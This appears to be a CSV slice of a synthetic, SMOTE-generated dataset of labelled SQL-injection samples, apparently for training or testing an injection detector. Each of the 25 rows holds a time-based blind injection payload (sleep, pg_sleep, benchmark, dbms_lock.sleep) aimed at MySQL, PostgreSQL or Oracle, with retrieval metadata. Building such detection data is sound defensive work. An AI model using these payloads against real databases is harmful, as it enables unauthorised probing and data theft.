id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000176,attack,time,"1""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""dplf"" like ""dplf",nearest_attack_euclidean,R000077,1.5206582326277653
SMOTE_000177,attack,time,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',nearest_attack_euclidean,R000161,0.35721225060385225
SMOTE_000178,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'fgcg'  =  'fgcg",nearest_attack_euclidean,R000299,0.04381493448284874
SMOTE_000179,attack,time,"1%"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ""%""  =  """,nearest_attack_euclidean,R000240,1.1625981223834436
SMOTE_000180,attack,time,1'   )    )     )   or sleep  (  5  )   and    (    (     (  'wuwv'  =  'wuwv,nearest_attack_euclidean,R000293,0.038926065215309176
SMOTE_000181,attack,time,1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000126,0.07176675336647553
SMOTE_000182,attack,time,1   )    )     )   rlike sleep  (  5  )   and    (    (     (  6790  =  6790,nearest_attack_euclidean,R000296,1.172271966856846
SMOTE_000183,attack,time,"1%'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000198,0.26794383993505677
SMOTE_000184,attack,time,1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,nearest_attack_euclidean,R000119,0.5815351446802102
SMOTE_000185,attack,time,1   )    )    as uadn where 9588  =  9588 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000148,1.4739982452512113
SMOTE_000186,attack,time,"1""   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000222,0.4277252137810868
SMOTE_000187,attack,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""eran""  =  ""eran",nearest_attack_euclidean,R000045,0.8205979323073013
SMOTE_000188,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   -- sztf",nearest_attack_euclidean,R000057,0.10980095120732315
SMOTE_000189,attack,time,"1,  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000221,0.8286566117828612
SMOTE_000190,attack,time,"1""   )    )    or sleep  (  5  )   and    (    (   ""mcyv""  =  ""mcyv",nearest_attack_euclidean,R000144,0.3238880783247678
SMOTE_000191,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000099,0.5416670446906295
SMOTE_000192,attack,time,"1  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000162,0.07537551695235707
SMOTE_000193,attack,time,1'   )    )     )   or sleep  (  5  )   and    (    (     (  'bmnf' like 'bmnf,nearest_attack_euclidean,R000279,1.5334652135114
SMOTE_000194,attack,time,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000121,0.913766075230503
SMOTE_000195,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000013,0.3540298447805808
SMOTE_000196,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000012,0.4551243133499863
SMOTE_000197,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""zhxm""  =  ""zhxm",nearest_attack_euclidean,R000213,0.11947763170369728
SMOTE_000198,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""kojr""  =  ""kojr",nearest_attack_euclidean,R000053,1.0356658761013249
SMOTE_000199,attack,time,1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000249,0.1690017883218616
SMOTE_000200,attack,time,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000225,0.9196971874122771
